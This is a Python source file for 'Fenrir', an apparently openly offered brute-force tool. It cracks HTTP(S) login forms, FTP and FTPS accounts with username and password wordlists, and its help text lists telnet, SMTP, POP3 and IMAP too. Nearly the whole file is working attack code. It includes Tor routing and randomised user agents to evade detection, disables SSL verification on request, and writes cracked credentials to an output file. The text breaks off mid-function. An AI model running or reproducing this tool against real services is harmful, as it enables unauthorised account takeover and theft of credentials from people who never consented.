import datetime
import hashlib
import imaplib
import queue
import sys
import requests
import ftplib
import telnetlib
import smtplib
import poplib
import threading
import itertools
import random
import base64
from termcolor import *

users_agents = []
with open("user_agents.txt") as file:

    for lines in file:

        users_agents.append(lines.strip())
found_credentials = {'login':None, 'password':None}
stop_all_thread = False
tor_error = False
msg_help = ""
error_msg = ""


def get_random_message():

    m = ["We become hated both by doing good and by doing evil.",
    "But man's ambition is so great that, in order to satisfy a present will, he does not think of the evil that may after some time result from it.",
    "Give a man a gun and he\'ll rob a bank. Give a man a bank and he\'ll rob the world.",
    "Men when they are not forced to fight for necessity, they fight for ambition."]

    return random.choice(m)

def logo():
    global get_random_message

    print(f"""
  █████▒▓█████  ███▄    █  ██▀███   ██▓ ██▀███  
▓██   ▒ ▓█   ▀  ██ ▀█   █ ▓██ ▒ ██▒▓██▒▓██ ▒ ██▒
▒████ ░ ▒███   ▓██  ▀█ ██▒▓██ ░▄█ ▒▒██▒▓██ ░▄█ ▒
░▓█▒  ░ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██▀▀█▄  ░██░▒██▀▀█▄  
░▒█░    ░▒████▒▒██░   ▓██░░██▓ ▒██▒░██░░██▓ ▒██▒
 ▒ ░    ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒▓ ░▒▓░░▓  ░ ▒▓ ░▒▓░
 ░       ░ ░  ░░ ░░   ░ ▒░  ░▒ ░ ▒░ ▒ ░  ░▒ ░ ▒░  [Created by H3nry Vilani]
 ░ ░       ░      ░   ░ ░   ░░   ░  ▒ ░  ░░   ░          version 2.0
           ░  ░         ░    ░      ░     ░     
                                                

{get_random_message()}
    """)

def help_message():

    global msg_help

    if msg_help != "":

        print(f'[-] {msg_help}')

    else:

        print("Syntax: fenrir.py [--target TARGET] [--protocol PROTOCOL] [-l LOGIN [-L WORDLIST]] [-p PASSWORD [-P WORDLIST]] [--data DATA] [--threads THREADS] [--text-error TEXT] [--satus-error STATUS] [--success-text TEXT] [--success-status STATUS] [--cookies COOKIES] [-v] [--tor] [--random-agent] [--encode-passwd ENCODE TYPE] [--encode-username ENCODE TYPE]")

        print("\n")

        print("Options:")
        print("  --target           set host to attack")
        print("  --data             set data from request [*USER* and *PASS* are passed as entries in --date, *USER* is passed as input to -l and -L and *PASS* is passed as input to -p and -P]")
        print("  -l                 set username")
        print("  -L                 set userame wordlist")
        print("  -p                 set password")
        print("  -P                 set password wordlist")
        print("  -v                 use verbose [default: not enable]")
        print("  --tor              use tor connection [default: not enable]")
        print("  --text-error       set text when not successfully logged in")
        print("  --status-error     set status code when not successfully logged in")
        print("  --success-text     set text when success logged")
        print("  --success-text     set status code when success logged")
        print("  --threads          set number of threads [default: 15]")
        print("  --cookies          set specific cookies")
        print("  --random-agent     use random users agents [default: not enabled]")
        print("  --encode-username  set encode to username, encodes supported: base85, base64, base32, base16")
        print("  --encode-passwd    set encode to password, encodes supported: base85, base64, base32, base16")
        print("  --list             used to list used to list something [protocols, encodes]")
        print("  -h/--help          shows all help or shows the help of a specified metro")
        print("  -o/--output        set output file, if the output file is not specified it will generate a default file called fenrir_output.txt")
        print("  --no-verify        enables non-verification of the ssl certificate")

    exit()

def error_message():

    global error_msg

    cprint(f"{error_msg}", 'red')
    exit()

def alert_message(alert_msg):

    cprint(f"[!] {alert_msg}", 'yellow')

def help_command(command):

    global help_message

    if command == "protocols":

        print("Protocols:")
        print(" - https-post")
        print(" - http-post")
        print(" - ftp")
        print(" - ftps")
        print(" - telnet")
        print(" - smtp")
        print(" - smtps")
        print(" - pop3")
        print(" - pop3s")
        print(" - imap4")
        print(" - imap4s")
    
    elif command == "encodes":

        print("Encodes:")
        print(" - base16")
        print(" - base32")
        print(" - base64")
        print(" - base85")
        print(" - md2")
        print(" - md5")
        print(" - sha1")
        print(" - sha224")
        print(" - sha256")
        print(" - sha384")
        print(" - sha512")

    elif command == "--target":

        print("Syntax: --target [TARGET]")
        print(" - Set target to attack")

    elif command == "--data":

        print("Syntax: --data [DATA]")
        print(" - Set data to attack [Used on http[s]-post protocols]")

    elif command == "-l":

        print("Syntax: -l [LOGIN]")
        print(" - Set login")

    elif command == "-p":

        print("Syntax: -p [PASSWORD]")
        print(" - Set password")

    elif command == "-L":

        print("Syntax: -L")
        print(" - Set login wordlist to crack")

    elif command == "-P":

        print("Syntax: -P")
        print(" - Set password wordlist")

    elif command == "-encode-login" or command == "-el":

        print("Syntax: --encode-login [ENCODE TYPE]")
        print(" - Set encode type to encode login")

    elif command == "encode-password" or command == "ep":
        
        print("Syntax: --encode-password [ENCODE TYPE]")
        print(" - Set encode type to encode password")

    elif command == "--threads":

        print("Syntax: --threads [NUMBER TASK]")
        print(" - Set number of threads")

    elif command == "--tor":

        print("Syntax: --tor")
        print(" - Connect tor [configured only for http[s]-post]")

    elif command == "--text-error":

        print("Syntax: --text-error [TEXT]")
        print(" - Set error text for check requests [configured only for http[s]-post]")

    elif command == "--text-succes":
        
        print("Syntax: --text-success [TEXT]")
        print(" - Set success text for check requests [configured only for http[s]-post]")

    elif command == "--success-status":

        print("Syntax: --status-success [CODE]")
        print(" - Set success status code for check requests [configured only for http[s]-post]")

    elif command == "--error-status":

        print("Syntax: --status-erro [CODE]")
        print(" - Set error status code for check requests [configured only for http[s]-post]")

    elif command == "--cookies":

        print("Syntax: --cokies [COOKIES]")
        print(" - Set cookies [configured only for http[s]-post]")

    elif command == "--verbose" or command == "-v":

        print("Syntax: -v/--verbose")
        print(" - Set verbose true")

    elif command == "--random-agents":

        print("Syntax: --random-agents")
        print(" - Set random agents true [configured only for http[s]-post]")

    elif command == "--output" or command == "-o":

        print("Syntax: --output [FILE] OR --output")
        print(" - Set file to save credentials found [DEFAUT NAME FILE IS: fenrir_output.txt]")

    elif command == "--port":

        print("Syntax: --port")
        print(" - Set port to connect [the default is protocol]")

    elif command == "--list":

        print("Syntax: --list [OPTION]")
        print("Options:")
        print(" - protocols")

    elif command == '--help' or command == "-h":

        print("Syntax: --help [COMMAND] OR --help")
        print(" - Show command help or show general help")

    elif command == "--no-verify":

        print("Syntax: --no-verify")
        print(" - Enables non-verification of the ssl certificate, used when the ssl certificate is expired")

    else:

        help_message()

def parse_options(argv) -> dict:

    global help_command

    options = {
        "protocol":None,
        "target":None,
        "data":None,
        "login":None,
        "password":None,
        "login_wordlist":None,
        "password_wordlist":None,
        "encode_login":None,
        "encode_password":None,
        "threads":15,
        "tor_connection":False,
        "text_error":None,
        "text_success":None,
        "status_code_success":None,
        "status_code_error":None,
        "cookies":None,
        "verbose":False,
        "random_agents":False,
        "output_file":None,
        "port":0,
        "list_protocols":False,
        "no_verify":False
    }

    index = 0

    while index < len(argv):

        if argv[index] == '--protocol':

            options['protocol'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--target' or argv[index] ==  '-t':

            options['target'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--port':

            options['port'] = int(argv[index+1])
            
            index+=1
            continue

        elif argv[index] == '-l':

            options['login'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-L':

            options['login_wordlist'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-p':

            options['password'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-P':

            options['password_wordlist'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--data':

            options['data'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--tor':

            options['tor_connection'] = True
            index+=1
            continue

        elif argv[index] == '--text-error':

            options['text_error'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--status-error':

            options['status_error'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--success-text':

            options['text_success'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--success-status':

            options['status_success'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--threads':

            options['threads'] = int(argv[index+1])

            index+=1
            continue

        elif argv[index] == '--cookies':

            options['cookies'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-v' or argv[index] == '--verbose':

            options['verbose'] = True
            index+=1
            continue

        elif argv[index] == '--random-agents':

            options['random_agents'] = True
            index+=1
            continue

        elif argv[index] == '--encode-login' or argv[index] == '-el':

            options['encode_login'] = argv[index+1]
            index+=1
            continue

        elif argv[index] == '--encode-password' or argv[index] == '-ep':

            options['encode_password'] = argv[index+1]
            index+=1
            continue

        elif argv[index] == '--help' or argv[index] == '-h':

            if index == len(argv)-1:

                help_message()

            else:

                help_command(argv[index+1])
                exit()

        elif argv[index] == '--list':

            if argv[index+1] == 'protocols':

                help_command("protocols")
                exit()

            elif argv[index+1] == 'encodes':

                help_command("encodes")
                exit()

        elif argv[index] == '-o' or argv[index] == '--output':

            if argv[index+1] in options:

                options['output_file'] = "fenrir_output.txt"

            else:

                options['output_file'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--no-verify':

            options['no_verify'] = True
            index+=1
            continue


        else:

            index+=1
            continue

    return options

def check_options(options) -> bool:

    global msg_help

    if options['protocol'] == None:

        msg_help = f"Protocol {options['protocol']} is not supported"

        return False

    elif options['target'] == None:

        msg_help = "Unspecified target"

        return False

    elif len(options['params']) == 0:

        msg_help = "Unspecified param"

        return False

    else:

        return True

def append_output(credentials, options):

    output_file = open(options['output_file'], 'a')

    time = datetime.datetime.now()

    content = f"Login: {credentials['username']} -- Password: {credentials['password']} -- found at {time.month}/{time.day}/{time.year} {time.hour}:{time.minute}:{time.second}\n"

    output_file.write(content)
    output_file.close()

def tor_is_connected() -> bool:

    global random_user_agent

    proxy = {"http":"socks5://127.0.0.1:9050", "https":"socks5://127.0.0.1:9050"}
    header = {"User-Agent":random_user_agent()}

    try:

        check_tor_website = requests.get("https://check.torproject.org/", headers=header, proxies=proxy)

    except requests.exceptions.ConnectionError:

        return False

    if 'Sorry. You are not using Tor.' in check_tor_website.text:

        return False

    else:

        return True

def encode_text(encode, text):

    if encode == None:

        return text

    elif encode == 'base64':

        return base64.b64encode(text.encode()).decode()

    elif encode == 'bsae85':

        return base64.b85encode(text.encode()).decode()

    elif encode == 'base32':

        return base64.b32encode(text.encode()).decode()

    elif encode == 'base16':

        return base64.b16encode(text.encode()).decode()

    elif encode == 'md5':

        return hashlib.new('md5', text.encode()).hexdigest()

    elif encode == 'md2':

        return hashlib.new('md2', text.encode()).hexdigest()

    elif encode == 'sha1':

        return hashlib.sha1(text.encode()).hexdigest()
        
    elif encode == 'sha224':

        return hashlib.sha224(text.encode()).hexdigest()

    elif encode == 'sha256':

        return hashlib.sha256(text.encode()).hexdigest()

    elif encode == 'sha384':

        return hashlib.sha384(text.encode()).hexdigest()

    elif encode == 'sha512':

        return hashlib.sha512(text.encode()).hexdigest()

    else:

        return text

def intertool_wordlists(wordlists=[]):

    global stop_all_thread

    wordlist_out = queue.Queue(maxsize=1000)

    wordlists_arr = []
    wordlist_temp = []

    try:

        with open(wordlists[0], 'r', errors='ignore') as file:

            for lines in file:

                if stop_all_thread:

                    return

                wordlist_temp.append(lines)

        wordlists_arr.append(wordlist_temp)
        wordlist_temp.clear()

        with open(wordlists[1], 'r', errors='ignore') as file:

            for lines in file:

                if stop_all_thread:

                    return

                wordlist_temp.append(lines)

        wordlists_arr.append(wordlist_temp)        

        for product in itertools.product(wordlists_arr[0], wordlists_arr[1]):

            if stop_all_thread:

                return

            wordlist_out.put_nowait(product)



        
        return wordlist_out

    except KeyboardInterrupt:

        return


def is_logged(request, options) -> bool:

    if options['protocol'] == 'https-post' or 'https-get':

        if options['text_error'] != None:

            if options['text_error'] in request.text:

                return False

            else:

                return True

        elif options['status_code_error'] != None:

            if request.status_code == options['status_code_error']:

                return False

            else:

                return True

        elif options['text_success'] != None:

            if options['text_success'] in request.text:

                return True

            else:

                return False

        elif options['status_code_success'] != None:

            if request.status_code == options['status_code_success']:

                return True

            else:

                return False

        else:

            return False

    elif options['protocol'] == "ftp":

        if request[0:2] == '230':

            return True

        else:

            return False

def parse_data(data, login, password):

    data = str(data)

    if options['encode_login'] != None:

        login = encode_text(options['encode_login'], login)

    if options['encode_password'] != None:

        password = encode_text(options['encode_password'], password)

    data = data.replace("*USER*", login)
    data = data.replace("*PASS*", password)

    data_dict = {}

    for params in data.split('&'):

        p = params.split('=')

        data_dict[p[0]] = p[1]

    return data_dict

def parse_cookies(cookie_string) -> dict:

    cookies = {}

    cookie_splited = cookie_string.split(';')

    for cookie in cookie_splited:

        cookie_parse = cookie.split('=')

        cookies[cookie_parse[0]] = cookie_parse[1]

def config_cookies_to_request(cookies_string) -> dict:

    cookies_dict = {}

    for cookie in cookies_string.split(';'):

        cookies_dict[cookie.split('=')[0]] = cookie.split('=')[1]

    return cookies_dict

def random_user_agent():

    global users_agents

    while True:

        user_agent = random.choice(users_agents)

        if user_agent == '':

            continue

        else:

            return user_agent

def check_type_crack() -> str:

    '''
        Return Type Crack:

            - normal_login
            - crack_password
            - crack_login
            - full_crack
    '''

    global options

    if options['login'] != None and options['password'] != None:

        return 'normal_login'

    elif options['login'] != None and options['password_wordlist'] != None:

        return 'crack_password'

    elif options['login_wordlist'] != None and options['password'] != None:

        return 'crack_login'

    else:
        
        return 'full_crack'

def load_wordlist(wordlist_file):

    wordlist_out = queue.Queue()

    try:

        with open(wordlist_file, "r", errors='ignore') as file:

            cprint("[*] Reading wordlist...", 'yellow', end='\r')

            for line in file:

                  wordlist_out.put(line.strip())

    except KeyboardInterrupt:

        print("Bye                 ")
        exit()

    sys.stdout.flush()
    cprint("[+] Done               ", 'green')

    return wordlist_out


def crack_https_post(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies
    global alert_message

    header = {}
    proxy = {}
    cookie = {}

    session = requests.Session()


    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if options['random_agents']:

            header['User-Agent'] = random_user_agent()

        if options['cookies'] != None:

            cookie = parse_cookies(options['cookies'])

        if options['no_verify']:

            requests.packages.urllib3.disable_warnings()



        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            data = parse_data(options['data'], options['login'], options['password'])


            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue


            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError:

                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

            if is_logged(primary_request, options) == False:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

            else:

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            login = ""
            password = ""
            primary_request = ""
            
            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            data = parse_data(options['data'], login, password)

            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

                

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue

            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError as err:


                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue


            if is_logged(primary_request, options):

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue

            else:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

        elif check_type_crack() == 'crack_login':

            login = ""
            password = ""
            primary_request = ""

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue


            data = parse_data(options['data'], login, password)

            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue


            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError:

                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue


            if is_logged(primary_request, options):

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue

            else:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

        else:

            values = ""

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            data = parse_data(options['data'], login, password)

            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue


            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError:

                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue


            if is_logged(primary_request, options):

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue

            else:

                if options['verbose']:

                    cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

    if error_msg != "":

        error_message()
    
    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_http_post(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    header = {}
    proxy = {}
    cookie = {}

    session = requests.Session()
    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if options['random_agents']:

            header['User-Agent'] = random_user_agent()

        if options['cookies'] != None:

            cookie = parse_cookies(options['cookies'])

        if options['no_verify']:

            requests.packages.urllib3.disable_warnings()


        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            data = parse_data(options['data'], options['login'], options['password'])


            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue

            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError:

                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

            if is_logged(primary_request, options) == False:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

            else:

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            login = ""
            password = ""
            primary_request = ""

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue


            data = parse_data(options['data'], login, password)

            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue

            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError:

                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue
                    # quando sair mostrar o erro


            if is_logged(primary_request, options):

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue

            else:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

        elif check_type_crack() == 'crack_login':

            login = ""
            password = ""
            primary_request = ""

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            data = parse_data(options['data'], login, password)

            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue

            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError:

                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue


            if is_logged(primary_request, options):

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue

            else:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

        else:

            login = ""
            password = ""
            primary_request = ""

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue



            login = values[0]
            password = values[1]

            data = parse_data(options['data'], login, password)

            try:

                primary_request = session.post(options['target'], data=data, headers=header, proxies=proxy, cookies=cookie, verify=not options['no_verify'])

            except requests.exceptions.InvalidSchema:

                error_msg = "[ERROR] Invalid target url"
                stop_all_thread = True 
                continue

            except requests.exceptions.SSLError:

                error_msg = "Expired SSL certificate, use --no-verify not to check the SSL cerficate"
                stop_all_thread = True
                continue

            except requests.exceptions.ConnectionError:

                if options['tor_connection']:

                    if tor_is_connected() == False:

                        tor_error = True                

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue


            if is_logged(primary_request, options):

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue

            else:

                if options['verbose']:

                    cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()


    if error_msg != "":

        error_message()
    
    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_ftp(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    ftp = ftplib.FTP()

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    ftp.connect(options['target'], options['port'], timeout=5)

                else:

                    ftp.connect(options['target'], 21, timeout=5)

                ftp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except ftplib.error_perm:

                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    ftp.connect(options['target'], options['port'], timeout=5)

                else:

                    ftp.connect(options['target'], 21)

                ftp.login(user=login, passwd=password, timeout=5)

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                

            except ftplib.error_perm:


                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()
            
            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

        elif check_type_crack() == 'crack_login':

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    ftp.connect(options['target'], options['port'], timeout=5)

                else:

                    ftp.connect(options['target'], 21, timeout=5)

                ftp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                

            except ftplib.error_perm:


                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

        else:

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    ftp.connect(options['target'], options['port'], timeout=5)

                else:

                    ftp.connect(options['target'], 21, timeout=5)

                ftp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                

            except ftplib.error_perm:


                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

    
    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_ftps(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    ftps = ftplib.FTP_TLS()

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    ftps.connect(options['target'], options['port'], timeout=5)

                else:

                    ftps.connect(options['target'], 21, timeout=5)

                ftps.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except ftplib.error_perm:

                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    ftps.connect(options['target'], options['port'], timeout=5)

                else:

                    ftps.connect(options['target'], 21)

                ftps.login(user=login, passwd=password, timeout=5)

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                

            except ftplib.error_perm:


                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()
            
            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

        elif check_type_crack() == 'crack_login':

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    ftps.connect(options['target'], options['port'], timeout=5)

                else:

                    ftps.connect(options['target'], 21, timeout=5)

                ftps.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                

            except ftplib.error_perm:


                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

        else:

            try:

